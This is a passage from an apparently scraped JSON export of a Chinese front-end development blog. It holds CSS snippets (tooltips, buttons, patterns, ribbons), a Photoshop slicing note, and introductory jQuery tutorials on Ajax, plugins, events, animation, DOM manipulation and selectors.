url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAMAAAAp4XiDAAAAUVBMVEWFhYWDg4N3d3dtbW17e3t1dXWBgYGHh4d5eXlzc3OLi4ubm5uVlZWPj4+NjY19fX2JiYl/f39ra2uRkZGZmZlpaWmXl5dvb29xcXGTk5NnZ2c8TV1mAAAAG3RSTlNAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAvEOwtAAAFVklEQVR4XpWWB67c2BUFb3g557T/hRo9/WUMZHlgr4Bg8Z4qQgQJlHI4A8SzFVrapvmTF9O7dmYRFZ60YiBhJRCgh1FYhiLAmdvX0CzTOpNE77ME0Zty/nWWzchDtiqrmQDeuv3powQ5ta2eN0FY0InkqDD73lT9c9lEzwUNqgFHs9VQce3TVClFCQrSTfOiYkVJQBmpbq2L6iZavPnAPcoU0dSw0SUTqz/GtrGuXfbyyBniKykOWQWGqwwMA7QiYAxi+IlPdqo+hYHnUt5ZPfnsHJyNiDtnpJyayNBkF6cWoYGAMY92U2hXHF/C1M8uP/ZtYdiuj26UdAdQQSXQErwSOMzt/XWRWAz5GuSBIkwG1H3FabJ2OsUOUhGC6tK4EMtJO0ttC6IBD3kM0ve0tJwMdSfjZo+EEISaeTr9P3wYrGjXqyC1krcKdhMpxEnt5JetoulscpyzhXN5FRpuPHvbeQaKxFAEB6EN+cYN6xD7RYGpXpNndMmZgM5Dcs3YSNFDHUo2LGfZuukSWyUYirJAdYbF3MfqEKmjM+I2EfhA94iG3L7uKrR+GdWD73ydlIB+6hgref1QTlmgmbM3/LeX5GI1Ux1RWpgxpLuZ2+I+IjzZ8wqE4nilvQdkUdfhzI5QDWy+kw5Wgg2pGpeEVeCCA7b85BO3F9DzxB3cdqvBzWcmzbyMiqhzuYqtHRVG2y4x+KOlnyqla8AoWWpuBoYRxzXrfKuILl6SfiWCbjxoZJUaCBj1CjH7GIaDbc9kqBY3W/Rgjda1iqQcOJu2WW+76pZC9QG7M00dffe9hNnseupFL53r8F7YHSwJWUKP2q+k7RdsxyOB11n0xtOvnW4irMMFNV4H0uqwS5ExsmP9AxbDTc9JwgneAT5vTiUSm1E7BSflSt3bfa1tv8Di3R8n3Af7MNWzs49hmauE2wP+ttrq+AsWpFG2awvsuOqbipWHgtuvuaAE+A1Z/7gC9hesnr+7wqCwG8c5yAg3AL1fm8T9AZtp/bbJGwl1pNrE7RuOX7PeMRUERVaPpEs+yqeoSmuOlokqw49pgomjLeh7icHNlG19yjs6XXOMedYm5xH2YxpV2tc0Ro2jJfxC50ApuxGob7lMsxfTbeUv07TyYxpeLucEH1gNd4IKH2LAg5TdVhlCafZvpskfncCfx8pOhJzd76bJWeYFnFciwcYfubRc12Ip/ppIhA1/mSZ/RxjFDrJC5xifFjJpY2Xl5zXdguFqYyTR1zSp1Y9p+tktDYYSNflcxI0iyO4TPBdlRcpeqjK/piF5bklq77VSEaA+z8qmJTFzIWiitbnzR794USKBUaT0NTEsVjZqLaFVqJoPN9ODG70IPbfBHKK+/q/AWR0tJzYHRULOa4MP+W/HfGadZUbfw177G7j/OGbIs8TahLyynl4X4RinF793Oz+BU0saXtUHrVBFT/DnA3ctNPoGbs4hRIjTok8i+algT1lTHi4SxFvONKNrgQFAq2/gFnWMXgwffgYMJpiKYkmW3tTg3ZQ9Jq+f8XN+A5eeUKHWvJWJ2sgJ1Sop+wwhqFVijqWaJhwtD8MNlSBeWNNWTa5Z5kPZw5+LbVT99wqTdx29lMUH4OIG/D86ruKEauBjvH5xy6um/Sfj7ei6UUVk4AIl3MyD4MSSTOFgSwsH/QJWaQ5as7ZcmgBZkzjjU1UrQ74ci1gWBCSGHtuV1H2mhSnO3Wp/3fEV5a+4wz//6qy8JxjZsmxxy5+4w9CDNJY09T072iKG0EnOS0arEYgXqYnXcYHwjTtUNAcMelOd4xpkoqiTYICWFq0JSiPfPDQdnt+4/wuqcXY47QILbgAAAABJRU5ErkJggg==); background-color: #0094d0;&#125; 49、持久的列表排序 1234567891011121314151617181920ol.chapters &#123; list-style: none; margin-left: 0;&#125;ol.chapters &gt; li:before &#123; content: counter(chapter) \". \"; counter-increment: chapter; font-weight: bold; float: left; width: 40px;&#125;ol.chapters li &#123; clear: left;&#125;ol.start &#123; counter-reset: chapter;&#125;ol.continue &#123; counter-reset: chapter 11;&#125; 50、CSS悬浮提示文本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061a &#123; border-bottom:1px solid #bbb; color:#666; display:inline-block; position:relative; text-decoration:none;&#125;a:hover,a:focus &#123; color:#36c;&#125;a:active &#123; top:1px; &#125;/* Tooltip styling */a[data-tooltip]:after &#123; border-top: 8px solid #222; border-top: 8px solid hsla(0,0%,0%,.85); border-left: 8px solid transparent; border-right: 8px solid transparent; content: \"\"; display: none; height: 0; width: 0; left: 25%; position: absolute;&#125;a[data-tooltip]:before &#123; background: #222; background: hsla(0,0%,0%,.85); color: #f6f6f6; content: attr(data-tooltip); display: none; font-family: sans-serif; font-size: 14px; height: 32px; left: 0; line-height: 32px; padding: 0 15px; position: absolute; text-shadow: 0 1px 1px hsla(0,0%,0%,1); white-space: nowrap; -webkit-border-radius: 5px; -moz-border-radius: 5px; -o-border-radius: 5px; border-radius: 5px;&#125;a[data-tooltip]:hover:after &#123; display: block; top: -9px;&#125;a[data-tooltip]:hover:before &#123; display: block; top: -41px;&#125;a[data-tooltip]:active:after &#123; top: -10px;&#125;a[data-tooltip]:active:before &#123; top: -42px;&#125; 51、深灰色的圆形按钮 12345678910111213141516171819202122232425262728293031.graybtn &#123; -moz-box-shadow:inset 0px 1px 0px 0px #ffffff; -webkit-box-shadow:inset 0px 1px 0px 0px #ffffff; box-shadow:inset 0px 1px 0px 0px #ffffff; background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #ffffff), color-stop(1, #d1d1d1) ); background:-moz-linear-gradient( center top, #ffffff 5%, #d1d1d1 100% ); filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff', endColorstr='#d1d1d1'); background-color:#ffffff; -moz-border-radius:6px; -webkit-border-radius:6px; border-radius:6px; border:1px solid #dcdcdc; display:inline-block; color:#777777; font-family:arial; font-size:15px; font-weight:bold; padding:6px 24px; text-decoration:none; text-shadow:1px 1px 0px #ffffff;&#125;.graybtn:hover &#123; background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #d1d1d1), color-stop(1, #ffffff) ); background:-moz-linear-gradient( center top, #d1d1d1 5%, #ffffff 100% ); filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#d1d1d1', endColorstr='#ffffff'); background-color:#d1d1d1;&#125;.graybtn:active &#123; position:relative; top:1px;&#125; 52、在可打印的网页中显示URLs 12345@media print &#123; a:after &#123; content: \" [\" attr(href) \"] \"; &#125; &#125; 53、禁用移动Webkit的选择高亮 12345678body &#123; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none;&#125; 54、CSS3 圆点图案 12345body &#123; background: radial-gradient(circle, white 10%, transparent 10%), radial-gradient(circle, white 10%, black 10%) 50px 50px; background-size: 100px 100px;&#125; 55、CSS3 方格图案 1234567body &#123; background-color: white; background-image: linear-gradient(45deg, black 25%, transparent 25%, transparent 75%, black 75%, black), linear-gradient(45deg, black 25%, transparent 25%, transparent 75%, black 75%, black); background-size: 100px 100px; background-position: 0 0, 50px 50px;&#125; 56、Github的fork色带 1234567891011121314151617181920212223242526.ribbon &#123; background-color: #a00; overflow: hidden; /* top left corner */ position: absolute; left: -3em; top: 2.5em; /* 45 deg ccw rotation */ -moz-transform: rotate(-45deg); -webkit-transform: rotate(-45deg); /* shadow */ -moz-box-shadow: 0 0 1em #888; -webkit-box-shadow: 0 0 1em #888;&#125;.ribbon a &#123; border: 1px solid #faa; color: #fff; display: block; font: bold 81.25% 'Helvetiva Neue', Helvetica, Arial, sans-serif; margin: 0.05em 0 0.075em 0; padding: 0.5em 3.5em; text-align: center; text-decoration: none; /* shadow */ text-shadow: 0 0 0.5em #444;&#125; 57、CSS font属性缩写 123p &#123; font: italic small-caps bold 1.2em/1.0em Arial, Tahoma, Helvetica;&#125; 58、论文页面的卷曲效果 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950ul.box &#123; position: relative; z-index: 1; /* prevent shadows falling behind containers with backgrounds */ overflow: hidden; list-style: none; margin: 0; padding: 0; &#125;ul.box li &#123; position: relative; float: left; width: 250px; height: 150px; padding: 0; border: 1px solid #efefef; margin: 0 30px 30px 0; background: #fff; -webkit-box-shadow: 0 1px 4px rgba(0, 0, 0, 0.27), 0 0 40px rgba(0, 0, 0, 0.06) inset; -moz-box-shadow: 0 1px 4px rgba(0, 0, 0, 0.27), 0 0 40px rgba(0, 0, 0, 0.06) inset; box-shadow: 0 1px 4px rgba(0, 0, 0, 0.27), 0 0 40px rgba(0, 0, 0, 0.06) inset; &#125;ul.box li:before,ul.box li:after &#123; content: ''; z-index: -1; position: absolute; left: 10px; bottom: 10px; width: 70%; max-width: 300px; /* avoid rotation causing ugly appearance at large container widths */ max-height: 100px; height: 55%; -webkit-box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3); -moz-box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3); box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3); -webkit-transform: skew(-15deg) rotate(-6deg); -moz-transform: skew(-15deg) rotate(-6deg); -ms-transform: skew(-15deg) rotate(-6deg); -o-transform: skew(-15deg) rotate(-6deg); transform: skew(-15deg) rotate(-6deg); &#125;ul.box li:after &#123; left: auto; right: 10px; -webkit-transform: skew(15deg) rotate(6deg); -moz-transform: skew(15deg) rotate(6deg); -ms-transform: skew(15deg) rotate(6deg); -o-transform: skew(15deg) rotate(6deg); transform: skew(15deg) rotate(6deg); &#125; 59、鲜艳的锚链接 123456789101112131415161718192021222324a &#123; color: #00e;&#125;a:visited &#123; color: #551a8b;&#125;a:hover &#123; color: #06e;&#125;a:focus &#123; outline: thin dotted;&#125;a:hover, a:active &#123; outline: 0;&#125;a, a:visited, a:active &#123; text-decoration: none; color: #fff; -webkit-transition: all .3s ease-in-out;&#125;a:hover, .glow &#123; color: #ff0; text-shadow: 0 0 10px #ff0;&#125; 60、带CSS3特色的横幅显示 12345678910111213141516171819202122232425262728.featureBanner &#123; position: relative; margin: 20px&#125;.featureBanner:before &#123; content: \"Featured\"; position: absolute; top: 5px; left: -8px; padding-right: 10px; color: #232323; font-weight: bold; height: 0px; border: 15px solid #ffa200; border-right-color: transparent; line-height: 0px; box-shadow: -0px 5px 5px -5px #000; z-index: 1;&#125;.featureBanner:after &#123; content: \"\"; position: absolute; top: 35px; left: -8px; border: 4px solid #89540c; border-left-color: transparent; border-bottom-color: transparent;&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://ru23.com/tags/CSS/"},{"name":"Snippet","slug":"Snippet","permalink":"https://ru23.com/tags/Snippet/"}]},{"title":"PS基本切图及应用","slug":"2016-08-PS基本切图及应用","date":"2016-08-08T07:30:43.000Z","updated":"2018-10-24T03:46:01.867Z","comments":true,"path":"note/374c3d40.html","link":"","permalink":"https://ru23.com/note/374c3d40.html","excerpt":"之前一直用别人切好的页面，心中很是惭愧，为不在麻烦于他人，还是重新打开很久没用过得PS，学习了一下如何切页面，顺便整理一下近期学到的PS切图的基本方法。 美工一般只提供设计稿，那么问题来了，我们如何把设计稿切成自己想要的图片呢，今天我们来简单学习一下如何切图：","text":"之前一直用别人切好的页面，心中很是惭愧，为不在麻烦于他人，还是重新打开很久没用过得PS，学习了一下如何切页面，顺便整理一下近期学到的PS切图的基本方法。 美工一般只提供设计稿，那么问题来了，我们如何把设计稿切成自己想要的图片呢，今天我们来简单学习一下如何切图：切图我们一般只切两种类型的图片，JPG图片和icon图表。重点还是在icon上。 PS环境配置 ps中用到的快捷键： 放大：z 缩小：Ctrl+alt+空格+鼠标点击 切片：c 移动：v 拖动：空格+鼠标拖动‘ 撤销：Ctrl+z ctrl+alt+z 保存：Ctrl+shift+Alt+s 配置工作环境： 基本图片的切法 icon图标切法 图片在网页中的定位12345678910111213141516171819*&#123; margin:0; padding:0;&#125;html,body&#123; width:100%; height:100%;&#125;.tb&#123;background-image:url(\"icon.png\");background-repeat:no-repeat;display:block;&#125;.icon&#123; width:28px; height:28px; background-position:-28px 0px;&#125;.icon1&#123; width:38px; height:38px; background-position:-39px -27px;&#125; 12 &lt;span class=\"icon tb\"&gt;&lt;/span&gt; &lt;span class=\"icon1 tb\"&gt;&lt;/span&gt; 这里介两种图片的定位方法 方法一：通过浏览器的插件定位图片的具体位置 方法二：在ps原稿中测量图片的位置 （完）","categories":[{"name":"Designed","slug":"Designed","permalink":"https://ru23.com/categories/Designed/"}],"tags":[{"name":"PS","slug":"PS","permalink":"https://ru23.com/tags/PS/"}]},{"title":"jQuery基础之Ajax（六）","slug":"2016-08-jQuery基础之Ajax（六）","date":"2016-08-07T14:30:08.000Z","updated":"2018-10-24T03:46:01.855Z","comments":true,"path":"note/b5fbc47.html","link":"","permalink":"https://ru23.com/note/b5fbc47.html","excerpt":"ajax : Asynchronous Javascript And XML （异步的JavaScript和XML） 创建ajax对象 var xhr = new XMLHttpRequest();","text":"ajax : Asynchronous Javascript And XML （异步的JavaScript和XML） 创建ajax对象 var xhr = new XMLHttpRequest(); 准备发送请求 get 传递的数据放在URL后面 中文编码 encodeURI( &#39;&#39; ); 缓存 在数据后面加上随机数或者日期对象或者……; post 传递的数据放在send()里面，并且一定要规定数据格式 没有缓存问题 form表单中: action: method:(默认是get) get: 会在url里面以 name=value , 两个数据之间用 &amp; 连接 post: enctype: &quot;application/x-www-form-urlencoded&quot; url 是否异步 同步(false)：阻塞 异步(true)：非阻塞 正式发送请求 ajax请求处理过程 案列： 1234567891011121314151617181920212223242526var ajx = null;if(window.XMLHttpRequest)&#123;//兼容处理 var ajx = new XMLHttpRequest();//一般浏览器&#125;else&#123; ajx = new ActiveXObject(\"Microsoft.XMLHTTP\");//IE6+&#125;//准备发送请求ajx.open(\"get\",\"ajax.txt\",true);//正式发送请求ajx.send();//处理请求ajx.onreadystatechange = function()&#123; if(ajx.readState == 4)&#123; if (ajx.status == 200)//200是HTTP 请求成功的状态码 &#123; console.log(ajx.responseText); &#125;else&#123; alert(\"请求出错\"); &#125; &#125;&#125; onreadystatechange ：当处理过程发生变化的时候执行下面的函数 readyState ：ajax处理过程 0：请求未初始化（还没有调用open()）。 1：请求已经建立，但是还没有发送（还没有调用 send()）。 2：请求已发送，正在处理中（通常现在可以从响应中获取内容头）。 3：请求在处理中；通常响应中已有部分数据可用了，但是服务器还没有完成响应的生成。 4：响应已完成；您可以获取并使用服务器的响应了。 responseText：请求服务器返回的数据存在该属性里面 status : http状态码","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"https://ru23.com/tags/jQuery/"}]},{"title":"jQuery基础之插件（六）","slug":"2016-08-jQuery基础之插件（六）","date":"2016-08-07T14:10:08.000Z","updated":"2018-10-24T03:46:01.859Z","comments":true,"path":"note/a062eb06.html","link":"","permalink":"https://ru23.com/note/a062eb06.html","excerpt":"什么是插件插件(Plugin)也称为jQuery的扩展。以jQuery核心代码为基础编写的符合一定规范的应用程序。通过`js文件的方式引用。","text":"什么是插件插件(Plugin)也称为jQuery的扩展。以jQuery核心代码为基础编写的符合一定规范的应用程序。通过`js文件的方式引用。 插件分为哪几类 UI类、表单及验证类、输入类、特效类、Ajax类、滑动类、图形图像类、导航类、综合工具类、动画类等等 引入插件的步骤 a.引入jquery.js文件，而且在所以插件之前引入 b.引入插件 c.引入插件相关文件，比如皮肤、中文包 使用插件（验证demo） 如何自定义插件： 插件形式分为3类： a. 封装对象方法插件 b. 封装全局函数插件 c. 选择器插件(类似于.find()) 自定义插件的规范（解决各种插件的冲突和错误，增加成功率） 命名：jquery.插件名.js 所有的新方法附加在jquery.fn对象上面，所有新功能附加在jquery上 所有的方法或插件必须用分号结尾，避免出问题 插件必须返回jQuery对象，便于链式连缀 避免插件内部使用$，如果要使用，请传递jQuery($并不是总等于jQuery，另外其他js框架也可能使用$) 插件中的this应该指向jQuery对象 使用this.each()迭代元素 自定义插件案例 为了方便用户创建插件，jQuery提供了 jQuery.extend() 和 jQuery.fn.extend() jQuery.extend()：创建工具函数或者是选择器 jQuery.fn.extend()：创建jQuery对象命令 （fn相当于prototype的别名） 自定义jQuery函数： 1234567(function($)&#123; $.extend(&#123; test: function()&#123; alert(\"hello plugin\"); &#125; &#125;) &#125;)(jQuery); 自定义jQuery命令： 形式1： 1234567(function($)&#123; $.fn.extend(&#123; say : function()&#123; alert(\"hello plugin\"); &#125; &#125;) &#125;)(jQuery); 形式2： 123456(function($)&#123; $.fn.say = function()&#123; alert(\"hello plugin\"); &#125;; &#125;)(jQuery);","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"https://ru23.com/tags/jQuery/"}]},{"title":"jQuery基础之Event（五）","slug":"2016-08-jQuery基础之Event（五）","date":"2016-08-07T14:10:08.000Z","updated":"2018-10-24T03:46:01.857Z","comments":true,"path":"note/246e66eb.html","link":"","permalink":"https://ru23.com/note/246e66eb.html","excerpt":"什么是Event？","text":"什么是Event？ Event属性： type：获取事件类型名称 target:发生事件的节点 keyCode：只针对于keypress事件，获取键盘键数字 按下回车，13 pageX:光标对于页面原点的水平坐标 pageY：光标对于页面原点的垂直坐标 浏览器 clientX：光标对于浏览器窗口的水平坐标 clientY：光标对于浏览器窗口的垂直坐标 电脑屏幕 screenX：光标对于电脑屏幕的水平坐标 screenY：光标对于电脑屏幕的水平坐标 stopPropagation()：阻止冒泡 从里到外 嵌套关系 相同事件 其中的某一父类没有相同事件时,继续向上查找 bind();绑定 为匹配元素绑定处理方法 需要给一个元素添加多个事件 ，事件执行一样时候 one()：只执行一次 绑定特定事件类型方法： blur() focus() mousedown() resize() change() keydown() mousemove() scroll() click() keypress() mouseout() select() dblclick() keyup() mouseover() submit() error() load() mouseup() unload()","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"https://ru23.com/tags/jQuery/"}]},{"title":"jQuery动画基础（四）","slug":"2016-08-jQuery动画基础（四）","date":"2016-08-07T13:10:08.000Z","updated":"2018-10-24T03:46:01.853Z","comments":true,"path":"note/5f9d254.html","link":"","permalink":"https://ru23.com/note/5f9d254.html","excerpt":"介绍jQuery动画 JavaScript语言本身不支持动画设计，必须通过改变`CSS来实现动画效果。","text":"介绍jQuery动画 JavaScript语言本身不支持动画设计，必须通过改变`CSS来实现动画效果。 显隐 显隐动画 show():显示 show()从上到下增加元素的高度，从左到右增加元素宽度，从0到1增加透明度，直至内容完全可见 hide():隐藏 hide()通过改变元素的高度宽度和不透明度，直到这三个属性值到0 参数： show() show(speed,callback) speed: 字符串或数字，表示动画将运行多久（slow=0.6/normal=0.4/fast=0.2） callback: 动画完成时执行的方法 显示和隐藏式一对密不可分的动画形式。 显隐切换 toggle():切换元素的可见状态 原理：匹配元素的宽度、高度以及不透明度，同时进行动画，隐藏动画后将display设置为none 参数： toggle(speed) toggle(speed,callback) toggle(boolean) speed: 字符串或数字，表示动画将运行多久（slow=0.6/normal=0.4/fast=0.2） easing： 使用哪个缓冲函数来过渡的字符串(linear/swing) callback： 动画完成时执行的方法 boolean:true为显示 false为隐藏 滑动 显隐滑动效果 slideDown():滑动隐藏 slidUp():滑动显示 参数: slideDown(speed,callback) slidUp(speed,callback) 显隐切换滑动 slideToggle():显隐滑动切换 参数: slidUp(speed,callback) 渐变：通过改变不透明度 淡入淡出 fadeIn() fadeOut() 参数 fadeIn(speed,callback) fadeOut(speed,callback) 设置淡出透明效果 fadeTo()⁭：以渐进的方式调整到指定透明度 参数： fadeTo(speed,opacity,callback) 渐变切换: 结合fadeIn和fadeOut fadeToggle() 参数: fadeOut(speed,callback) 自定义： 自定义动画：animate() 用animate模拟show(): show: 表示由透明到不透明 toggle: 切换 hide:表示由显示到隐藏","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"https://ru23.com/tags/jQuery/"}]},{"title":"jQuery操作DOM（三）","slug":"2016-08-jQuery操作DOM（三）","date":"2016-08-07T13:10:08.000Z","updated":"2018-10-24T03:46:01.861Z","comments":true,"path":"note/f854d664.html","link":"","permalink":"https://ru23.com/note/f854d664.html","excerpt":"操作DOM","text":"操作DOM 什么是DOM：Document Object Model缩写，文档对象模型 理解页面的树形结构 什么是节点：是DOM结构中最小单元，包括元素、属性、文本、文档等。 创建节点 创建元素 语法： 1234document.createElement(name);var div = document.createElement(\"div\");document.body.appendChild(div); $(html)：根据传递的标记字符串，创建DOM对象 创建文本 1234567var div = document.createElement(\"div\");var txt = document.createTextNode(\"DOM\");div.appendChild(txt);document.body.appendChild(div);var $div = = $(\"&lt;div&gt;DOM&lt;/div&gt;\");$(body).append($div); 设置属性 语法：setAttrbute(name,value) 12345678var div = document.createElement(\"div\");var txt = document.createTextNode(\"DOM\");div.appendChild(txt);document.body.appendChild(div);div.setAttribute(\"title\",\"盒子\");var $div = = $(\"&lt;div title='盒子'&gt;DOM&lt;/div&gt;\");$(body).append($div); 插入内容 内部插入 向元素最后面插入节点： append():向每个匹配的元素内部追加内容 appendTo():把所有匹配的元素追加到指定元素集合中，$(&quot;A&quot;).append(&quot;B&quot;) 等效 $(&quot;B&quot;).appendTo(&quot;A&quot;) 向元素最前面插入节点： prepend（）：把每个匹配的元素内部前置内容 prependTo（）：把所有匹配的元素前置到另一个指定的元素集合中,$(&quot;A&quot;).prepend(&quot;B&quot;) 等效$(&quot;B&quot;).prependTo(&quot;A&quot;) 外部插入 after():在每个匹配的元素之后插入内容 before()：在每个匹配想元素之前插入内容 insertAfter()：将所有匹配的元素插入到另一个指定的元素集合后面，$A.insert($B)等效 $B.insertAfter($A); insertBefore()：将所有匹配的元素插入到另一个指定的元素集合前面 $A.before($B) 等效 $B.insertBefore($A); 删除内容 移除 remove():从DOM中删除所有匹配元素 清空 empty():删除匹配的元素集合中所有子节点内容 克隆内容：创建指定节点副本 clone() 注意：若clone（true）则是包括克隆元素的属性，事件等 替换内容 replaceWith():将所有匹配的元素替换成指定的元素 replaceAll():用匹配的元素替换掉指定元素 注意：两者效果一致，只是语法不同 $A.replaceAll($B) 等效于 $B.replaceWhith($A);","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"https://ru23.com/tags/jQuery/"}]},{"title":"jQuery选择器及优化（二）","slug":"2016-08-jQuery选择器及优化（二）","date":"2016-08-07T13:05:08.000Z","updated":"2018-10-24T03:46:01.865Z","comments":true,"path":"note/62bd05db.html","link":"","permalink":"https://ru23.com/note/62bd05db.html","excerpt":"层级选择器:通过DOM的嵌套关系匹配元素","text":"层级选择器:通过DOM的嵌套关系匹配元素 jQuery层级选择器—-包含选择器、子选择器、相邻选择器、兄弟选择器4种 包含选择器：$(&quot;a b&quot;)在给定的祖先元素下匹配所有后代元素。(不受层级限制) 子选择器：$(&quot;parent &gt; child&quot;) 在给定的父元素下匹配所有子元素。 相邻选择器：$(&quot;prev + next&quot;) 匹配所有紧接在prev元素后的next元素。 兄弟选择器：$(&quot;prev ~ siblings&quot;) 匹配prev元素之后的所有sibling元素。 案例： 12345678910111213141516171819202122&lt;BODY&gt; &lt;!--包含选择器/子选择器/兄弟选择器/相邻选择器--&gt; &lt;div class=\"main\"&gt; &lt;span&gt;1&lt;img src=\"images/1.jpg\"/&gt;&lt;/span&gt; 2&lt;img src=\"images/1.jpg\"/&gt; &lt;/div&gt; 3&lt;img src=\"images/1.jpg\"&gt; 4&lt;img src=\"images/1.jpg\"&gt; &lt;div&gt; 5&lt;img src=\"images/1.jpg\"&gt; &lt;/div&gt; &lt;script type=\"text/javascript\" src=\"js/jquery.js\"&gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; $(function()&#123; //$(\".main img\").css(\"border\",\"5px solid red\"); //$(\".main &gt; img\").css(\"border\",\"5px solid blue\"); //$(\".main + img\").css(\"border\",\"5px solid blue\"); $(\".main ~ img\").css(\"border\",\"5px solid blue\"); &#125;); &lt;/script&gt; &lt;/BODY&gt; 综合应用： 1234567891011121314151617181920212223242526&lt;body&gt; &lt;h1&gt;沁园春·雪&lt;/h1&gt; &lt;h2&gt;毛泽东&lt;/h2&gt; &lt;div&gt; &lt;span&gt;&lt;div&gt;北国风光，千里冰封，万里雪飘。 &lt;div&gt;望长城内外，惟余莽莽；大河上下，顿失滔滔。&lt;/div&gt; &lt;p&gt;山舞银蛇，原驰蜡象，欲与天公试比高。&lt;/p&gt; &lt;p&gt;须晴日，看红装素裹，分外妖娆。&lt;/p&gt; &lt;/div&gt;&lt;/span&gt; &lt;p id=\"mp\"&gt;江山如此多娇，引无数英雄竞折腰。&lt;/p&gt; &lt;/div&gt; &lt;p class=\"c1\"&gt;惜秦皇汉武，略输文采；唐宗宋祖，稍逊风骚。&lt;/p&gt; &lt;p class=\"c1\"&gt;一代天骄，成吉思汗，只识弯弓射大雕。&lt;/p&gt; &lt;p&gt;俱往矣，数风流人物，还看今朝。&lt;/p&gt;&lt;/body&gt;&lt;!-- 1. 让id为mp的元素文字大小变成30px 2. 让class名为.c1的元素背景为#CCFF99 3. 将所有的div和p，统一显示间距 4. 将所有的div增加 2像素 实线 红色 5. 将div下的所有子div中文字变蓝色blue 6. 将div中包含的div颜色变成#FF99FF 7. 将div的所有兄弟标签p的字体颜色变成蓝色 8. 将紧跟着div的p标签的边框设为2像素 实线 #009900 --&gt; 常用伪类选择器:可以看作是一种特殊的类选择符 选择器 :first 匹配找到的第1个元素 :last 匹配找到的最后一个元素 :eq 匹配一个给定索引值的元素 :even 匹配所有索引值为偶数的元素 :odd 匹配所有索引值为奇数的元素 :gt(index) 匹配所有大于给定索引值的元素 :lt(index) 匹配所有小于给定索引值的元素 :not 去除所有与给定选择器匹配的元素 特定位置选择器 :first/:last/:eq(index) 例： 12345&lt;table&gt; &lt;tr&gt;&lt;th&gt;特定位置选择器&lt;/th&gt;&lt;th&gt;描述&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;:first&lt;/td&gt;&lt;td&gt;匹配找到的第一个元素&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;:last&lt;/td&gt;&lt;td&gt;匹配找到的最后一个元素&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; 指定范围选择器 :even/:odd/:gt(index)/:lt(index) 例： 123456789&lt;table&gt; &lt;tr&gt;&lt;th&gt;指定范围选择器&lt;/th&gt;&lt;th&gt;描述&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;:first&lt;/td&gt;&lt;td&gt;匹配找到的第一个元素&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;:last&lt;/td&gt;&lt;td&gt;匹配找到的最后一个元素&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;:even&lt;/td&gt;&lt;td&gt;匹配所有索引值为偶数的元素&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;:odd&lt;/td&gt;&lt;td&gt;匹配所有索引值为奇数的元素&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;:gt(index)&lt;/td&gt;&lt;td&gt;匹配所有索引大于给定索引值的元素&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;:lt(index)&lt;/td&gt;&lt;td&gt;匹配所有索引小于给定索引值的元素&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; 排除选择器 :not 非 例： 1234&lt;table&gt; &lt;tr&gt;&lt;th&gt;排除选择器&lt;/th&gt;&lt;th&gt;描述&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;:not&lt;/td&gt;&lt;td&gt;排除符合特定匹配规则的元素&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; 选择器优化： 使用合适的选择器表达式可以提高性能、增强语义并简化逻辑。常用的选择器中，ID选择器速度最快，其次是类型选择器。 多用ID选择器 少直接使用class选择器 多用父子关系，少用嵌套关系 缓存jQuery对象 使用过滤器 jQuery提供了2种选择文档元素的方式：选择器和过滤器 类过虑器：根据元素的类属性来进行过滤操作。 hasClass(className)：判断当前jQuery对象中的某个元素是否包含指定类名，包含返回true，不包含返回false 下标过滤器：精确选出指定下标元素 eq(index)：获取第N个元素。index是整数值，下标从0开始 表达式过滤器 filter(expr)/(fn)：筛选出与指定表达式/函数匹配的元素集合。 功能最强大的表达式过滤器，可接收函数参数，也可以是简单的选择器表达式 映射 map(callback)：将一组元素转换成其他数组 清洗 not(expr)：删除与指定表达式匹配的元素 截取 slice(start,end)：选取一个匹配的子集 查找 向下查找后代元素 children():取得所有元素的所有子元素集合（子元素） find():搜索所有与指定表达式匹配的元素(所有后代元素中查找) 